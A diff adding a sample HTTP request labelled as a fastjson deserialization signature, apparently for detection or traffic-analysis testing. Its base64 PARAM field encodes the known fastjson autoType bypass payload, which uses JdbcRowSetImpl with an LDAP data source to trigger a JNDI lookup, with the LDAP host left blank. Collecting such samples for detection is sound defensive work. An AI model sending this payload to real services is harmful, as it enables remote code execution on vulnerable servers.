@@ -1,0 +1,11 @@
+# fastjson 反序列化特征
+POST /VerifyToken HTTP/1.1
+Host: www.xwd_test.com
+Content-Length: 226
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+X-Forwarded-For: 2408:8606:4800:4:c600:adff:feb5:f392
+
+
+PARAM=eyJuYW1lIjp7IkB0eXBlIjoiamF2YS5sYW5nLkNsYXNzIiwidmFsIjoiY29tLnN1bi5yb3dzZXQuSmRiY1Jvd1NldEltcGwifSwieCI6eyJAdHlwZSI6ImNvbS5zdW4ucm93c2V0LkpkYmNSb3dTZXRJbXBsIiwiZGF0YVNvdXJjZU5hbWUiOiJsZGFwOi8vIiwiYXV0b0NvbW1pdCI6dHJ1ZX19
